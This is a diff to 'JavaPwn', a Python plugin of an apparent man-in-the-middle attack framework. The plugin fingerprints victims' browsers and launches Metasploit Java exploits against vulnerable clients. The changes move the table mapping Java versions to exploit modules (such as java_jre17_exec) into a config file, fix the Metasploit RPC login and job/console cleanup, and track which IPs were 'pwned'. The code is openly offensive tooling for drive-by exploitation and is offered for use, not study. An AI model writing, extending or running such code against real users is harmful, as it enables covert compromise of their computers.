@@ -1,12 +1,17 @@
 from plugins.plugin import Plugin
 from plugins.BrowserProfiler import BrowserProfiler
 from time import sleep
-import libs.msfrpc
+import libs.msfrpc as msfrpc
 import string
 import random
 import threading
 import logging
 import sys, os
+
+try:
+    from configobj import ConfigObj
+except:
+    sys.exit('[-] configobj library not installed!')
 
 class JavaPwn(BrowserProfiler, Plugin):
     name = "JavaPwn"
@@ -21,16 +26,20 @@ class JavaPwn(BrowserProfiler, Plugin):
         self.msfport = options.msfport
         self.rpcip = options.rpcip
         self.rpcpass = options.rpcpass
+        self.javapwncfg = options.javapwncfg
 
         if not self.msfip:
             sys.exit('[-] JavaPwn plugin requires --msfip')
+
+        if not self.javapwncfg:
+            self.javapwncfg = './config_files/javapwn.cfg'
         
-        #Correlates java versions with their relative exploits
-        self.javaVersionDic = {1.702: "java_atomicreferencearray",
-                               1.704: "java_verifier_field_access",
-                               1.706: "java_jre17_exec",
-                               1.707: "java_jre17_jaxws"}
-                               #add your exploits here converting the max affected java version to a float (e.g. java version 1.7.05 => 1.705)
+        self.javacfg = ConfigObj(self.javapwncfg)
+
+        self.javaVersionDic = {}
+        for key, value in self.javacfg.iteritems():
+            self.javaVersionDic[float(key)] = value
+
 
         self.sploited_ips = [] # store ip of pwned or not vulnarable clients so we don't re-exploit
 
@@ -39,7 +48,7 @@ class JavaPwn(BrowserProfiler, Plugin):
             msf.login('msf', self.rpcpass)
             version = msf.call('core.version')['version']
             print "[*] Succesfully connected to Metasploit v%s" % version
-        except:
+        except Exception:
             sys.exit("[-] Error connecting to MSF! Make sure you started Metasploit and its MSGRPC server")
 
         #Initialize the BrowserProfiler plugin
@@ -166,11 +175,13 @@ class JavaPwn(BrowserProfiler, Plugin):
         options.add_argument('--msfport', dest='msfport', default='8080', help='Port of MSF web-server [default: 8080]')
         options.add_argument('--rpcip', dest='rpcip', default='127.0.0.1', help='IP of MSF MSGRPC server [default: localhost]')
         options.add_argument('--rpcpass', dest='rpcpass', default='abc123', help='Password for the MSF MSGRPC server [default: abc123]')
+        options.add_argument('--javapwncfg', type=file, help='Specify a config file')
 
     def finish(self):
         '''This will be called when shutting down'''
         msf = msfrpc.Msfrpc({"host": self.rpcip})
         msf.login('msf', self.rpcpass)
+        
         jobs = msf.call('job.list')
         if len(jobs) > 0:
             print '[*] Stopping all running metasploit jobs'
@@ -180,5 +191,5 @@ class JavaPwn(BrowserProfiler, Plugin):
         consoles = msf.call('console.list')['consoles']
         if len(consoles) > 0:
             print "[*] Closing all virtual consoles"
-            for b,i,p in consoles.items():
-                msf.call('console.destroy', [i])
+            for console in consoles:
+                msf.call('console.destroy', [console['id']])
